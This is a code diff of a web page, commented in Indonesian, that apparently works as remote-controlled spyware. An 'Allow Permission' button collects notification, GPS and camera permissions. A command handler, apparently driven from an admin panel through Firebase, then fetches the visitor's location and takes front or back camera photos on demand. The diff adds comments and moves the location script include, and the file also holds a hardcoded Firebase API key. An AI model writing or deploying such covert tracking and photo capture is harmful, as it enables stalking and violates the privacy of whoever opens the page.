@@ -6,6 +6,7 @@
 
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+<script src="loc.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
 <style>
@@ -132,8 +133,6 @@ button:active { transform: translateY(0); }
 <button onclick="activateAll()">Allow Permission</button>
 </div>
 
-<script src="loc.js"></script>
-
 <script>
 const firebaseConfig = {
 apiKey: "AIzaSyC71owbERIUTdALLUeTILc9KTWYuZ5TNqQ",
@@ -160,12 +159,14 @@ let isProcessing = false;
 function goAdmin(){ window.location.href="admin.html"; }
 
 async function activateAll(){
+  // 1. Meminta Izin Notifikasi (Dibuat terpisah agar aman lintas browser)
   try {
     if ("Notification" in window && Notification.permission !== "granted") {
       Notification.requestPermission();
     }
   } catch (e) { console.log("Notifikasi ditolak", e); }
   
+  // 2. Meminta Izin Lokasi dengan validasi pencegah error
   let askGPS = new Promise((resolve) => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(resolve, resolve, { timeout: 3000 });
@@ -174,6 +175,7 @@ async function activateAll(){
     }
   });
   
+  // 3. Meminta Izin Kamera dengan validasi pencegah error (fatal crash)
   let askCam = new Promise((resolve) => {
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
       navigator.mediaDevices.getUserMedia({video:true})
@@ -211,7 +213,7 @@ if(!cmd) return;
 if(isProcessing) return;
 isProcessing = true;
 try{
-if(cmd === "get_location"){ await getLocation(); }
+if(cmd === "get_location"){ await getLocation(); } // Memanggil fungsi dari loc.js
 if(cmd === "take_photo_front"){ await capturePhoto("user"); }
 if(cmd === "take_photo_back"){ await capturePhoto("environment"); }
 if(cmd === "force_logout"){ forceLogout(); }
